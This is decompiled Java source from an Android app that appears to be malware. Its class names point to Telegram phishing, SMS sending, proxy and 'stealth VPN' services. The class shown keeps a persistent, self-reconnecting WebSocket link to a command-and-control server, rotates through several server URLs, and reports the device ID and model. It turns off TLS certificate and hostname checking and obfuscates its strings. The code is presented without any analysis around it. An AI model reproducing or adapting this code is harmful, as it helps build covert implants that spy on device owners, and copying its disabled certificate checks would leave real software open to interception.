package com.base.template.network;

import android.content.Context;
import android.os.Build;
import androidx.tracing.Trace;
import com.base.template.NativeBridge;
import com.base.template.TelegramPhishActivity$$ExternalSyntheticLambda0;
import com.base.template.services.CommandService$onCreate$1$2;
import com.base.template.services.ProxyService;
import com.base.template.services.StealthVpnService;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URI;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;
import javax.net.SocketFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.X509TrustManager;
import kotlin.text.StringsKt__StringsJVMKt;
import okhttp3.ConnectionPool;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.internal.Util;
import okhttp3.internal.ws.RealWebSocket;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class WsPersistManager {
    public static final OkHttpClient client;
    public static ProxyService.AnonymousClass1 commandCallback;
    public static CommandService$onCreate$1$2 connectCallback;
    public static volatile Context connectContext;
    public static int consecutiveHbFailures;
    public static CommandService$onCreate$1$2 disconnectCallback;
    public static Thread heartbeatThread;
    public static volatile boolean isConnected;
    public static volatile long lastConnectAttemptMs;
    public static volatile long lastConnectedAtMs;
    public static volatile long lastPongMs;
    public static volatile boolean manualDisconnect;
    public static volatile int rapidFailCount;
    public static volatile Thread reconnectThread;
    public static volatile RealWebSocket ws;
    public static volatile int wsConsecutiveFailCount;
    public static volatile int wsUrlIndex;
    public static final Object lock = new Object();
    public static final AtomicLong generation = new AtomicLong(0);
    public static volatile String deviceId = "";
    public static volatile long reconnectDelay = 3000;

    public abstract class TrustAllCerts {
        public static final SSLContext sslContext;
        public static final SmsFastSend$trustManager$1 trustManager;

        static {
            SmsFastSend$trustManager$1 smsFastSend$trustManager$1 = new SmsFastSend$trustManager$1(2);
            trustManager = smsFastSend$trustManager$1;
            SSLContext sSLContext = SSLContext.getInstance(C0000.decode(new byte[]{99, 124, 102}, "705680", 0.0f));
            sSLContext.init(null, new X509TrustManager[]{smsFastSend$trustManager$1}, null);
            sslContext = sSLContext;
        }
    }

    public final class VpnProtectedSocketFactory extends SocketFactory {

        /* JADX INFO: renamed from: default, reason: not valid java name */
        public final SocketFactory f0default = SocketFactory.getDefault();

        public static void configure(Socket socket) {
            StealthVpnService stealthVpnService = StealthVpnService.instance;
            StealthVpnService stealthVpnService2 = StealthVpnService.instance;
            if (stealthVpnService2 != null) {
                stealthVpnService2.protect(socket);
            }
            try {
                socket.setKeepAlive(true);
            } catch (Exception unused) {
            }
        }

        @Override // javax.net.SocketFactory
        public final Socket createSocket() throws IOException {
            Socket socketCreateSocket = this.f0default.createSocket();
            configure(socketCreateSocket);
            return socketCreateSocket;
        }

        @Override // javax.net.SocketFactory
        public final Socket createSocket(String str, int i) throws IOException {
            Socket socketCreateSocket = this.f0default.createSocket(str, i);
            configure(socketCreateSocket);
            return socketCreateSocket;
        }

        @Override // javax.net.SocketFactory
        public final Socket createSocket(String str, int i, InetAddress inetAddress, int i2) throws IOException {
            Socket socketCreateSocket = this.f0default.createSocket(str, i, inetAddress, i2);
            configure(socketCreateSocket);
            return socketCreateSocket;
        }

        @Override // javax.net.SocketFactory
        public final Socket createSocket(InetAddress inetAddress, int i) throws IOException {
            Socket socketCreateSocket = this.f0default.createSocket(inetAddress, i);
            configure(socketCreateSocket);
            return socketCreateSocket;
        }

        @Override // javax.net.SocketFactory
        public final Socket createSocket(InetAddress inetAddress, int i, InetAddress inetAddress2, int i2) throws IOException {
            Socket socketCreateSocket = this.f0default.createSocket(inetAddress, i, inetAddress2, i2);
            configure(socketCreateSocket);
            return socketCreateSocket;
        }
    }

    static {
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        builder.readTimeout = Util.checkDuration(0L, TimeUnit.MILLISECONDS);
        builder.connectTimeout = Util.checkDuration(5L, TimeUnit.SECONDS);
        VpnProtectedSocketFactory vpnProtectedSocketFactory = new VpnProtectedSocketFactory();
        if (!vpnProtectedSocketFactory.equals(builder.socketFactory)) {
            builder.routeDatabase = null;
        }
        builder.socketFactory = vpnProtectedSocketFactory;
        TelegramPhishActivity$$ExternalSyntheticLambda0 telegramPhishActivity$$ExternalSyntheticLambda0 = new TelegramPhishActivity$$ExternalSyntheticLambda0(2);
        if (!telegramPhishActivity$$ExternalSyntheticLambda0.equals(builder.hostnameVerifier)) {
            builder.routeDatabase = null;
        }
        builder.hostnameVerifier = telegramPhishActivity$$ExternalSyntheticLambda0;
        builder.sslSocketFactory(TrustAllCerts.sslContext.getSocketFactory(), TrustAllCerts.trustManager);
        client = new OkHttpClient(builder);
    }

    public static final void access$onDisconnected(long j) {
        synchronized (lock) {
            try {
                if (generation.get() != j) {
                    return;
                }
                long jCurrentTimeMillis = lastConnectedAtMs > 0 ? System.currentTimeMillis() - lastConnectedAtMs : 0L;
                isConnected = false;
                ws = null;
                lastPongMs = 0L;
                Thread thread = heartbeatThread;
                if (thread != null) {
                    thread.interrupt();
                }
                heartbeatThread = null;
                if (jCurrentTimeMillis >= 60000) {
                    reconnectDelay = 3000L;
                    int i = rapidFailCount - 1;
                    if (i < 0) {
                        i = 0;
                    }
                    rapidFailCount = i;
                    wsConsecutiveFailCount = 0;
                } else {
                    rapidFailCount++;
                    wsConsecutiveFailCount++;
                    if (wsConsecutiveFailCount >= 3) {
                        int size = NativeBridge.getAllUrls().size();
                        if (size > 1) {
                            wsUrlIndex = (wsUrlIndex + 1) % size;
                        }
                        wsConsecutiveFailCount = 0;
                    }
                    if (rapidFailCount >= 10) {
                        reconnectDelay = 30000L;
                        rapidFailCount = 10;
                    }
                }
                long j2 = jCurrentTimeMillis / ((long) 1000);
                try {
                    CommandService$onCreate$1$2 commandService$onCreate$1$2 = disconnectCallback;
                    if (commandService$onCreate$1$2 != null) {
                        commandService$onCreate$1$2.invoke();
                    }
                } catch (Exception unused) {
                }
                if (manualDisconnect) {
                    return;
                }
                scheduleReconnect();
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    public static String buildWsUrl() {
        int port;
        if (StringsKt__StringsJVMKt.isBlank(NativeBridge.getTeamId())) {
            return null;
        }
        List<String> allUrls = NativeBridge.getAllUrls();
        if (allUrls.isEmpty()) {
            return null;
        }
        String str = allUrls.get(Trace.coerceIn(wsUrlIndex, allUrls.size() - 1));
        if (StringsKt__StringsJVMKt.isBlank(str)) {
            return null;
        }
        try {
            URI uri = new URI(str);
            String host = uri.getHost();
            if (host == null) {
                return null;
            }
            boolean zStartsWith = str.startsWith(C0000.decode(new byte[]{89, 69, 64, 66, 65}, "11422316", 0.0f));
            String strDecode = C0000.decode(new byte[]{79, 66, 71}, "8145e3", false);
            String strDecode2 = zStartsWith ? strDecode : C0000.decode(new byte[]{22, 68}, "a7b7b4b5", 0);
            if (uri.getPort() > 0) {
                port = uri.getPort();
            } else {
                port = strDecode2.equals(strDecode) ? 443 : 80;
            }
            return strDecode2 + C0000.decode(new byte[]{9, 26, 31}, "350960") + host + C0000.decode(new byte[]{2}, "8d6c286f", 7) + port + C0000.decode(new byte[]{78, 82, 85, 85, 15, 1}, "a147cd8ef4ebc4", false);
        } catch (Exception unused) {
            return null;
        }
    }

    public static void connect(Context context) {
        String strDecode = C0000.decode(new byte[]{40, 12, 67, 12, 94, 13, 83, 73, 2, 30, 5, 68, 17, 47, 95, 8, 16, 27, 2, 69, 115, 15, 86, 20, 88, 89, 81, 68}, "ec9e2a2f705d9c6f", 5);
        synchronized (lock) {
            if (isConnected) {
                return;
            }
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (ws != null) {
                long j = jCurrentTimeMillis - lastConnectAttemptMs;
                if (j < 15000) {
                    return;
                }
                long j2 = j / ((long) 1000);
                try {
                    RealWebSocket realWebSocket = ws;
                    if (realWebSocket != null) {
                        realWebSocket.call.cancel();
                    }
                } catch (Exception unused) {
                }
                ws = null;
            }
            if (jCurrentTimeMillis - lastConnectAttemptMs < 3000) {
                ensureReconnectScheduled(context.getApplicationContext());
                return;
            }
            lastConnectAttemptMs = jCurrentTimeMillis;
            connectContext = context.getApplicationContext();
            manualDisconnect = false;
            deviceId = NativeBridge.getDeviceId();
            if (StringsKt__StringsJVMKt.isBlank(deviceId)) {
                ensureReconnectScheduled(context.getApplicationContext());
                return;
            }
            String strBuildWsUrl = buildWsUrl();
            if (strBuildWsUrl == null) {
                ensureReconnectScheduled(context.getApplicationContext());
                return;
            }
            long jIncrementAndGet = generation.incrementAndGet();
            Request.Builder builder = new Request.Builder();
            builder.url(strBuildWsUrl);
            ((ConnectionPool) builder.headers).set(C0000.decode(new byte[]{102, 66, 4, 19, 29, 118, 82, 80, 10, 23}, "31aa0755dc25"), strDecode + Build.VERSION.RELEASE + C0000.decode(new byte[]{93, 69}, "feb04d7e007ddc95", true) + Build.MODEL + C0000.decode(new byte[]{30, 18, 32, 17, 72, 15, 87, 102, 3, 87, 114, 8, 67, 29, 84, 82, 15, 77, 1, 7, 70, 29, 114, 41, 99, 127, 45, 77, 24, 15, 91, 90, 3, 21, 126, 4, 84, 89, 14, 72, 24, 32, 90, 67, 9, 88, 92, 78, 6, 1, 86, 79, 8, 77, 2, 31, 86, 21, 116, 14, 85, 91, 13, 4, 24, 48, 83, 87, 7, 71, 80, 78, 2, 1, 86, 79, 11, 85}, "72aa8c21f59a", 4));
            ws = client.newWebSocket(builder.build(), new WsPersistManager$connect$1$1(jIncrementAndGet));
        }
    }

    public static void disconnect() {
        synchronized (lock) {
            manualDisconnect = true;
            generation.incrementAndGet();
            isConnected = false;
            Thread thread = reconnectThread;
            if (thread != null) {
                thread.interrupt();
            }
            reconnectThread = null;
            Thread thread2 = heartbeatThread;
            if (thread2 != null) {
                thread2.interrupt();
            }
            heartbeatThread = null;
            try {
                RealWebSocket realWebSocket = ws;
                if (realWebSocket != null) {
                    realWebSocket.close(C0000.decode(new byte[]{0, 31, 81}, "bf427e", true), 1000);
                }
            } catch (Exception unused) {
            }
            ws = null;
        }
    }

    public static void ensureReconnectScheduled(Context context) {
        if (manualDisconnect || isConnected) {
            return;
        }
        Thread thread = reconnectThread;
        if (thread == null || !thread.isAlive()) {
            connectContext = context;
            scheduleReconnect();
        }
    }

    public static void forceReconnect(Context context) {
        synchronized (lock) {
            generation.incrementAndGet();
            Thread thread = reconnectThread;
            if (thread != null) {
                thread.interrupt();
            }
            reconnectThread = null;
            Thread thread2 = heartbeatThread;
            if (thread2 != null) {
                thread2.interrupt();
            }
            heartbeatThread = null;
            try {
                RealWebSocket realWebSocket = ws;
                if (realWebSocket != null) {
                    realWebSocket.call.cancel();
                }
            } catch (Exception unused) {
            }
            ws = null;
            isConnected = false;
            consecutiveHbFailures = 0;
            lastPongMs = 0L;
            manualDisconnect = false;
            rapidFailCount = 0;
            wsConsecutiveFailCount = 0;
            wsUrlIndex = 0;
            reconnectDelay = 3000L;
            lastConnectAttemptMs = 0L;
        }
        try {
            NativeBridge.setWsConnected(false);
        } catch (Exception unused2) {
        }
        connect(context);
    }

    public static boolean isHealthy() {
        synchronized (lock) {
            if (isConnected) {
                return System.currentTimeMillis() - Math.max(lastPongMs, lastConnectedAtMs) < 60000;
            }
            return false;
        }
    }

    public static void scheduleReconnect() {
        synchronized (lock) {
            if (manualDisconnect) {
                return;
            }
            Thread thread = reconnectThread;
            if (thread != null) {
                thread.interrupt();
            }
            reconnectThread = null;
            final Context context = connectContext;
            if (context == null) {
                return;
            }
            final long j = reconnectDelay;
            long j2 = (reconnectDelay * ((long) 15)) / ((long) 10);
            if (j2 > 45000) {
                j2 = 45000;
            }
            reconnectDelay = j2;
            Thread thread2 = new Thread(new Runnable() { // from class: com.base.template.network.WsPersistManager$$ExternalSyntheticLambda1
                @Override // java.lang.Runnable
                public final void run() {
                    long j3 = j;
                    Context context2 = context;
                    try {
                        Thread.sleep(j3);
                        if (WsPersistManager.manualDisconnect || WsPersistManager.isConnected) {
                            return;
                        }
                        Object obj = WsPersistManager.lock;
                        WsPersistManager.connect(context2);
                    } catch (InterruptedException unused) {
                    }
                }
            });
            thread2.setDaemon(true);
            thread2.start();
            reconnectThread = thread2;
        }
    }

    /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
        jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:21:0x0021
        	at jadx.core.dex.visitors.blocks.BlockSplitter.addTempConnectionsForExcHandlers(BlockSplitter.java:280)
        	at jadx.core.dex.visitors.blocks.BlockSplitter.visit(BlockSplitter.java:79)
        */
    public static void sendHeartbeat(android.content.Context r12) throws org.json.JSONException {
        /*
            Method dump skipped, instruction units count: 1231
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.base.template.network.WsPersistManager.sendHeartbeat(android.content.Context):void");
    }
}
